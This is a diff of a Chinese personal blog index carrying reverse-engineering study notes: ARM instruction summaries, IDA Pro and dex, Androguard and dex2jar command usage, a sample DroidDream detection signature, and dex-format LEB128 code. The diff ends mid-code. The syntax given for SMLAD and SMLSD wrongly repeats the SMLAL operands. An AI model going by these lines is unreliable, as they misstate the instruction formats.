+<li><strong>SMLAL</strong> 将Rm寄存器和Rn寄存器的值作为有符号数相乘，然后将64位的结果与RdHi、RdLo组成的64位数相加，结果的低32位存入RdLo寄存器，高32位存入RdHi寄存器 <em>SMLAL {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
+<li><strong>SMLAD</strong> 将Rm寄存器的低半字和Rn寄存器的低半字相乘，然后将Rm寄存器的高半字和Rn的高半字相乘，最后将两个乘积与Ra寄存器的值相加并存入Rd寄存器。 <em>SMLAD {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
+<li><strong>SMLSD</strong> 将Rm寄存器的低半字和Rn寄存器的低半字相乘，然后将Rm寄存器的高半字和Rn的高半字相乘，接着使用第一个乘积减去第二个乘积，最后将所得的差值与Ra寄存器的值相加并存入Rd寄存器 <em>SMLSD {cond}{S}RdLo,RdHi,Rm,Rn</em></li>
+<li><strong>SDIV</strong> 为有符号数除法指令 <em>SDIV{cond}Rd,Rm,Rn</em></li>
+<li><strong>UDIV</strong> 为无符号数除法指令 <em>UDIV{cond}Rd,Rm,Rn</em></li>
+<li><strong>ASR</strong> 算术右移指令 将Rm寄存器算术右移operand2位，并使用符号位填充空位，移位结果保存到Rd寄存器中 <em>ASR{cond}{S}Rd,Rm,operand2</em></li>
+</ul>
+</li>
+<li><p>逻辑运算指令</p>
+<ul>
+<li><strong>AND</strong> 逻辑与指令 <em>AND{cond}{S}Rd,Rn,operand2</em> </li>
+<li><strong>ORR</strong> 逻辑或指令 <em>ORR{cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>EOR</strong> 异或指令 <em>EOR{cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>BIC</strong> 位清除指令 将operand2的值取反，然后将结果与Rn寄存器的值相“与”并保存到Rd寄存器中 <em>BIC{cond}{S}Rd,Rn,operand2</em></li>
+<li><strong>LSL</strong> 逻辑左移指令 将Rm寄存器逻辑左移operand2位，并将空位清0，移位结果保存到Rd寄存器中 <em>LSL{cond}{S}Rd,Rm,operand2</em></li>
+<li><strong>LSR</strong> 逻辑右移指令 将Rm寄存器逻辑右移operand2位，并将空位清0，移位结果保存到Rd寄存器中 <em>LSR{cond}{S}Rd,Rm,operand2</em></li>
+<li><strong>ROR</strong> 循环右移指令 将Rm寄存器循环右移operand2位，寄存器右边移出的位移回到左边，移位结果保存到Rd寄存器中 <em>ROR{cond}{S}Rd,Rm,operand2</em></li>
+<li><strong>RRX</strong> 带扩展的循环右移指令 将Rm寄存器循环右移1位，寄存器最高位用标志位的值填充，移位结果保存到Rd寄存器中  <em>RRX{cond}{S}Rd,Rm</em></li>
+</ul>
+</li>
+<li><p>比较指令</p>
+<ul>
+<li><strong>CMP</strong> 使用Rn寄存器减去operand2的值 不保存计算结果 根据比较结果设置标志位 <em>CMP{cond}Rn,operand2</em></li>
+<li><strong>CMN</strong> 将operand2的值加到Rn寄存器  不保存计算结果 根据比较结果设置标志位  <em>CMN{cond}Rn,operand2</em></li>
+<li><strong>TST</strong> 位测试指令 将Rn寄存器的值和operand2的值进行“与”运算 不保存计算结果 根据比较结果设置标志位  <em>TST{cond}Rn,operand2</em></li>
+<li><strong>TEQ</strong> 将Rn寄存器的值和operand2的值进行“异或”运算 不保存计算结果 根据比较结果设置标志位  <em>TEQ{cond}Rn,operand2</em></li>
+</ul>
+</li>
+<li><p>OTHER</p>
+<ul>
+<li><p><strong>SWI</strong> 软中断指令 用于产生软中断，实现从用户模式到管理模式的切换 <em>SWI{cond},immed_24</em></p>
+</li>
+<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">immed_24为24位的中断号，在Android的系统中，系统功能调用为0号中断，使用R7寄存器存放系统调用号。</span><br><span class="line">使用R0-R3寄存器来传递系统调用的前4个参数，对于大于4个参数的调用，剩余参数采用堆栈来传递。</span><br><span class="line">MOV	R0,#0	@参数0</span><br><span class="line">MOV R7,#1	@系统功能号1为exit</span><br><span class="line">SWI	#0		@执行exit(0)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>NOP</strong> 空操作指令 用于空操作或字节对齐</p>
+</li>
+<li><p><strong>MRS</strong> 读状态寄存器指令 <em>MRS Rd,psr</em>  (psr的取值可以是CPSR或SPSR)</p>
+</li>
+<li><p><strong>MSR</strong>  写状态寄存器指令 <em>MSR Rd,psr_fielsd,operand2</em>  (field指定传送的区域)<br> <img src="/2018/08/22/Hello-ARM/4.png" alt="4"></p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MRS	R0,CPSR			@读取CPSR寄存器到R0寄存器中</span><br><span class="line">BIC	R0,R0,#0x80		@清除R0寄存器第7位</span><br><span class="line">MSR	CPSR_c,R0		@开启IRQ中断</span><br><span class="line">MOV	PC,LR			@子程序返回</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+</ul>
+<h3 id="NEON与VFP指令集"><a href="#NEON与VFP指令集" class="headerlink" title="NEON与VFP指令集"></a>NEON与VFP指令集</h3><p>NEON与VFP指令集是ARM指令集的扩展，多用于多媒体编程与浮点计算。（<strong>少见</strong>）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//要求</span><br><span class="line">1.在Android.mk文件中加入一行 LOCAL_ARM_NEON := true</span><br><span class="line">2.(NEON是ARMv7才支持的指令集)，需要设置TARGET_ARCH_ABI的值为armeabi-v7a</span><br><span class="line">3.Android NDK提供了一个“cpufeatures”库来让开发者在运行时检测处理器的能力,解决兼容</span><br><span class="line">4.使用“cpufeatures”库的方法</span><br><span class="line">	a.首先在Android.mk文件中添加 $(call import-module,android/cpufeatures)</span><br><span class="line">	b.C/C++代码中包含头文件 cpu-features.h </span><br><span class="line">	c.头文件中定义了一些结构体与枚举常量，并且包含了android_getCpuFamily()、android_getCpuFeatures()与android_getCpuCount()</span><br><span class="line">		A.android_getCpuFamily()函数用来获取处理器的家族信息,返回一个常量值ANDROID_CPU_FAMILY_ARM</span><br><span class="line">		B.android_getCpuFeatures()函数用来检测处理器支持的指令集,如果处理器支持NEON指令集，则返回的64			位数值中ANDROID_CPU_ARM_FEATURE_NEON标志就会被置位，如果处理器支持VFPv3指令集，则			     ANDROID_CPU_ARM_FEATURE_VFPv3就会被置位</span><br><span class="line">		C.android_getCpuCount ()函数用来获取处理器的核心数</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/22/Hello-ARM/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-IDA与Dex持续更新" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/IDA与Dex持续更新/">IDA与Dex持续更新</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/IDA与Dex持续更新/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:57:55.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="IDA与DEX"><a href="#IDA与DEX" class="headerlink" title="IDA与DEX"></a>IDA与DEX</h2><ul>
+<li>dex文件的数据结构大部分在Android系统源码中dalvik\libdex\DexFile.h文件，可将其中的结构整理为dex.idc脚本，分析dex文件时导入即可。</li>
+<li>“Edit→Structs→Struct var”，或者按下快捷键ALT+Q，弹出选择结构类型对话框，选择不同的节格式化显示</li>
+<li>“Edit→Structs→Struct var”，或者按下快捷键ALT+Q，弹出选择结构类型对话框，选择段跳转</li>
+<li>dex文件中所有方法可以点击Exports选项卡查看<ul>
+<li>方法的命名规则为<em>类名. 方法名@ 方法声明</em></li>
+</ul>
+</li>
+<li>IDA Pro的反汇编代码使用ref关键字来表示非Java标准类型的引用<ul>
+<li><code>CODE:0002CFC4   invoke-super    {this, c}, &lt;ref ResourceCursorAdapter.swapCursor(ref) imp. @ _def_ResourceCursorAdapter_swapCursor@LL&gt;</code><ul>
+<li>前面的ref是swapCursor()方法的返回类型，后面括号中的ref是参数类型</li>
+<li>IDA Pro能智能识别Android SDK的API函数并使用imp关键字标识出来<ul>
+<li>imp表明该方法为Android SDK中的API，@后面的部分为API的声明，类名与方法名之间使用下划线分隔</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>两种程序退出方法：<strong>Context的finish()方法与android.os.Process的killProcess()方法</strong></li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/IDA与Dex持续更新/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-Androguard" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/Androguard/">Androguard</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/Androguard/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:56:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Androguard的使用方法"><a href="#Androguard的使用方法" class="headerlink" title="Androguard的使用方法"></a>Androguard的使用方法</h2><ul>
+<li><p><strong>androapkinfo.py</strong></p>
+<ul>
+<li><strong>用来查看apk文件的信息</strong></li>
+<li>会输入apk文件的包、资源、权限、组件、方法等信息，输出的内容比较详细，可将输出信息重定向到文件后再进行查看</li>
+<li><code>./androapkinfo.py -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androaxml.py</strong></p>
+<ul>
+<li>用来<strong>解密apk包中的AndroidManifest.xml文件</strong></li>
+<li><code>./androaxml.py -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androcsign.py</strong></p>
+<ul>
+<li>用于<strong>添加apk文件的签名信息到一个数据库文件中</strong></li>
+<li>Androguard工具目录下的signatures/dbandroguard文件为收集的恶意软件信息数据库</li>
+<li>使用androcsign.py前需要为apk文件编写一个sign文件,json格式：eg</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">"SAMPLE"</span>:<span class="string">"apks/xxx.apk"</span>     /*SAMPLE指定需要添加信息的apk文件*/</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        "BASE":"AndroidOS",			/*BASE指定文件运行的系统，目前固定为AndroidOS*/</span><br><span class="line">        "NAME":"DroidDream",		/*NAME是该签名的名字*/</span><br><span class="line">        "SIGNATURE":[				/*具体的签名规则*/</span><br><span class="line">            &#123;</span><br><span class="line">                "TYPE":"METHSIM",	/*TYPE用来指定签名的类型，METHSIM表示的是方法的签名，CLASSSIM表示为类签名*/</span><br><span class="line">                "CN":"Lcom/droider/xxx/MainActivity$SNChecker;", /*指定方法所在的类*/</span><br><span class="line">                "MN":"isRegistered"，	/*指定了方法名*/</span><br><span class="line">                "D":"()Z"				/*D指定了方法的签名信息*/</span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line">        "BF":"0"					/*BF用来指定签名的检测规则*/</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
+<p>(json不允许/* //注释，需要则去掉注释部分)</p>
+<ul>
+<li><code>./androcsign.py -i signatures/xxx.apk -o signatures/dbandroguard</code></li>
+</ul>
+</li>
+<li><p><strong>androdd.py</strong></p>
+<ul>
+<li><strong>用来生成apk文件中每个类的方法的调用流程图</strong></li>
+<li><code>./androdd.py -i ./xxx.apk -o ./out -d -f PNG</code><ul>
+<li>-o选项强制指定一个输入目录，-d指定生成dot图形文件，-f用来指定输出的图片格式</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>androdiff.py</strong></p>
+<ul>
+<li><strong>用来比较两个apk文件的差异</strong></li>
+<li><code>./androdiff.py -i ./xxx.apk ./xxx1.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androdump.py</strong></p>
+<ul>
+<li><strong>用来dump一个Linux进程的信息</strong></li>
+<li><code>./androdump.py -i pid</code></li>
+</ul>
+</li>
+<li><p><strong>androgexf.py</strong></p>
+<ul>
+<li><strong>用来生成APK的GEXF格式的图形文件</strong></li>
+<li>可以使用Gephi查看gexf格式的图像</li>
+<li><code>./androgext.py -i ./xxx.apk -o ./xxx.gexf</code></li>
+</ul>
+</li>
+<li><p><strong>andromercury.py</strong></p>
+<ul>
+<li>Mercury工具的框架</li>
+<li><strong>功能是对Mercury的包装</strong></li>
+</ul>
+</li>
+<li><p><strong>androrisk.py</strong></p>
+<ul>
+<li><strong>用于评估apk文件中潜在的风险</strong></li>
+<li><code>./androrisk.py -m -i ./xxx.apk</code></li>
+</ul>
+</li>
+<li><p><strong>androsign.py</strong></p>
+<ul>
+<li><strong>用于检测apk的信息是否存在于特定的数据库中</strong>，作用与androcsign.py相反</li>
+<li><code>./androsign.py -i apks/xxx.apk -b signatures/dbandroguard -c signatures/dbconfig</code></li>
+</ul>
+</li>
+<li><p><strong>androsim.py</strong></p>
+<ul>
+<li><strong>用于计算两个apk文件的相似度</strong></li>
+<li><code>./androsim.py -i ./xxx.apk ./xxx1.apk</code></li>
+<li>Windows移植版=androsim.exe</li>
+</ul>
+</li>
+<li><p><strong>androxgmml.py</strong></p>
+<ul>
+<li><strong>用来生成apk/jar/class/dex文件的控制流程及功能调用图</strong>，输出格式为xgmml<br>   <code>./androxgmml.py -i  ./xxx.apk    -o xxx.xgmml</code></li>
+</ul>
+</li>
+<li><p><strong>apkviewer.py</strong></p>
+<ul>
+<li>用来为<strong>apk文件中每一个类生成一个独立的graphml图形文件</strong></li>
+<li><code>./apkviewer.py -i ./xxx.apk -o output</code></li>
+<li>Gephi打开生成后的graphml文件,图形中的每个节点是指令级别</li>
+</ul>
+</li>
+<li><p><strong>androlyze.py</strong></p>
+<ul>
+<li>强大的静态分析工具，它提供的一个<strong>独立的Shell环境</strong></li>
+<li><code>./androlyze.py-s</code>进入androlyze的shell交互环境</li>
+<li>androlyze.py通过访问<u>对象的字段与方法的方式</u>来提供反馈结果，可用到3个对象：apk文件对象、dex文件对象、分析结果对象<ul>
+<li>apk文件对象 <code>a=APK(&quot;./xxx.apk&quot;)</code>            (a.+tab 可显示该类所有方法与字段)</li>
+<li>dex文件对象<code>d=DalvikVMFormat(a.get_dex())</code></li>
+<li>分析结果对象 <code>dx=VMAnalysis(d)</code></li>
+<li>或一条命令解决 <code>a,d,dx=AnalyzeAPK(&quot;./xxx.apk&quot;, decompiler=&quot;dad&quot;)</code> </li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a.get_permissions()：输出apk用到的全部权限</span><br><span class="line">a.get_providers()：输出程序中所有的Content Provider</span><br><span class="line">a.get_receivers()：输出程序中所有的Broadcast Receiver</span><br><span class="line">a.get_services()：输出程序中所有的Service</span><br><span class="line">d.CLASS_Lcom_droider_XXX_MainActivity_2.METHOD_onClick.pretty_show():查看MainActivity$2的OnClick()方法.//source()显示Java源码</span><br><span class="line">dx.tainted_variables.get_string(&lt;要搜索的字符串&gt;)</span><br><span class="line">show_Path(d,dx.tainted_packages.search_packages(&lt;包名&gt;))</span><br></pre></td></tr></table></figure>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/Androguard/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-dex2jar用法" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/19/dex2jar用法/">dex2jar用法</a>
+    </h1>
+  
+
+        
+        <a href="/2018/08/19/dex2jar用法/" class="archive-article-date">
+  	<time datetime="2018-08-19T12:55:51.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>dex2jar用法<ul>
+<li>d2j-apk-sign用来为apk文件签名。命令格式：d2j-apk-sign xxx.apk。</li>
+<li>d2j-asm-verify用来验证jar文件。命令格式：d2j-asm-verify -d xxx.jar。</li>
+<li>d2j-dex2jar用来将dex文件转换成jar文件。命令格式：d2j-dex2jar xxx.apk</li>
+<li>d2j-dex-asmifier用来验证dex文件。命令格式：d2j-dex-asmifier xxx.dex。</li>
+<li>d2j-dex-dump用来转存dex文件的信息。命令格式：d2j-dex-dump xxx.apk out.jar。</li>
+<li>d2j-init-deobf用来生成反混淆jar文件时的初始化配置文件。</li>
+<li>d2j-jar2dex用来将jar文件转换成dex文件。命令格式：d2j-jar2dex xxx.apk。</li>
+<li>d2j-jar2jasmin用来将jar文件转换成jasmin格式的文件。命令格式：d2j-jar2jasmin xxx.jar</li>
+<li>d2j-jar-access用来修改jar文件中的类、方法以及字段的访问权限。</li>
+<li>d2j-jar-remap用来重命名jar文件中的包、类、方法以及字段的名称。</li>
+<li>d2j-jasmin2jar用来将jasmin格式的文件转换成jar文件。命令格式：d2j-jasmin2jar dir</li>
+<li>dex2jar为d2j-dex2jar的副本。</li>
+<li>dex-dump为d2j-dex-dump的副本</li>
+</ul>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/19/dex2jar用法/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-对比Java代码结构与Smali代码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1121,860 +1793,9 @@
 
 
   
-    <article id="post-dex文件格式详解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/08/15/dex文件格式详解/">dex文件格式详解</a>
-    </h1>
-  
-
-        
-        <a href="/2018/08/15/dex文件格式详解/" class="archive-article-date">
-  	<time datetime="2018-08-15T03:53:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-08-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="dex文件格式"><a href="#dex文件格式" class="headerlink" title="dex文件格式"></a>dex文件格式</h3><p><code>Android 4.0</code>源码<code>Dalvik/docs</code>目录下文档<code>dex-format.html</code>有详细介绍dex文件格式</p>
-<h4 id="1-dex文件中的数据结构"><a href="#1-dex文件中的数据结构" class="headerlink" title="1.dex文件中的数据结构"></a>1.dex文件中的数据结构</h4><p><img src="/2018/08/15/dex文件格式详解/d1.jpg" alt="d1"></p>
-<p><strong>dex文件使用到的数据类型</strong></p>
-<ul>
-<li>u1～u8表示1到8字节的无符号数，而sleb128、uleb128与uleb128p1则是dex文件中特有的LEB128数据类型。</li>
-<li>每个LEB128由1～5个字节组成，所有的字节组合在一起表示一个32位的数据。</li>
-<li>LEB128，每个字节只有7位为有效位，如果第1个字节的最高位为1，表示LEB128需要使用到第2个字节，如果第2个字节的最高位为1，表示会使用到第3个字节，以此类推，直到最后的字节最高位为0，当然，LEB128最多只会使用到5个字节，如果读取5个字节后下一个字节最高位仍为1，则表示该dex文件无效，Dalvik虚拟机在验证dex时会失败返回。</li>
-</ul>
-<p><img src="/2018/08/15/dex文件格式详解/d2.jpg" alt="d2"></p>
-<p><code>Android</code>源码<code>dalvik\libdex\Leb128.h</code>文件中可以找到LEB128的实现，读取无符号LEB128（uleb128）数据的代码：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DEX_INLINE <span class="keyword">int</span> <span class="title">readUnsignedLeb128</span><span class="params">(<span class="keyword">const</span> ul** pStream)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ul* ptr=*pStream;</span><br><span class="line">    <span class="keyword">int</span> result=*(ptr++);</span><br><span class="line">    <span class="keyword">if</span>(result&gt;<span class="number">0x7f</span>)&#123;				<span class="comment">//大于0x7f表示第1个字节最高位为1</span></span><br><span class="line">        <span class="keyword">int</span> cur=*(ptr++);			<span class="comment">//第2个字节</span></span><br><span class="line">        result=(result&amp;<span class="number">0x7f</span>)|((cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">7</span>);<span class="comment">//前2个字节组合</span></span><br><span class="line">        <span class="keyword">if</span>(cur&gt;<span class="number">0x7f</span>)&#123;				<span class="comment">//大于0x7f表示第2个字节最高位为1</span></span><br><span class="line">            cur=*(ptr++);			<span class="comment">//第3个字节</span></span><br><span class="line">            result|=(cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">14</span>;	<span class="comment">//前3个字节的组合</span></span><br><span class="line">            <span class="keyword">if</span>(cur&gt;<span class="number">0x7f</span>)&#123;</span><br><span class="line">                cur=*(ptr++);		<span class="comment">//第4个字节</span></span><br><span class="line">                result|=(cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">21</span>;<span class="comment">//前4个字节的组合</span></span><br><span class="line">                <span class="keyword">if</span>(cur&gt;<span class="number">0x7f</span>)&#123;</span><br><span class="line">                    cur=*(ptr++);	<span class="comment">//第5个字节</span></span><br><span class="line">                    result|=cur&lt;&lt;<span class="number">28</span>;<span class="comment">//前5个字节的组合</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    *pStream=ptr;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>对于有符号的LEB128（sleb128）来说，计算方法与无符号的LEB128是一样的，只是对无符号LEB128最后一个字节的最高有效位进行了符号扩展。读取有符号LEB128数据的代码如下：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DEX_INLINE <span class="keyword">int</span> <span class="title">readSignedLeb128</span><span class="params">(<span class="keyword">const</span> ul** pStream)</span></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ul* ptr=*pStream;</span><br><span class="line">    <span class="keyword">int</span> result=*(ptr++);</span><br><span class="line">    <span class="keyword">if</span>(result&lt;=<span class="number">0x7f</span>)&#123;				<span class="comment">//小于0x7f表示第1个字节的最高位不为1</span></span><br><span class="line">        result=(result&lt;&lt;<span class="number">25</span>)&gt;&gt;<span class="number">25</span>;	<span class="comment">//对第1个字节的最高有效位进行符号扩展</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cur=*(ptr++);			<span class="comment">//第2个字节</span></span><br><span class="line">        result=(result&amp;<span class="number">0x7f</span>)|((cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">7</span>);<span class="comment">//前2个字节组合</span></span><br><span class="line">        <span class="keyword">if</span>(cur&lt;=<span class="number">0x7f</span>)&#123;	</span><br><span class="line">            result=(result&lt;&lt;<span class="number">18</span>)&gt;&gt;<span class="number">18</span>;<span class="comment">//对结果进行符号位扩展</span></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            cur=*(ptr++);			<span class="comment">//第3个字节</span></span><br><span class="line">            result|=(cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">14</span>;	<span class="comment">//前3个字节的组合</span></span><br><span class="line">            <span class="keyword">if</span>(cur&lt;=<span class="number">0x7f</span>)&#123;</span><br><span class="line">                result=(result&lt;&lt;<span class="number">11</span>)&gt;&gt;<span class="number">11</span>;<span class="comment">//对结果进行符号位扩展</span></span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                cur=*(ptr++);		<span class="comment">//第4个字节</span></span><br><span class="line">                result|=(cur&amp;<span class="number">0x7f</span>)&lt;&lt;<span class="number">21</span>;<span class="comment">//前4个字节的组合</span></span><br><span class="line">                <span class="keyword">if</span>(cur&lt;=<span class="number">0x7f</span>)&#123;</span><br><span class="line">                    result=(result&lt;&lt;<span class="number">4</span>)&gt;&gt;<span 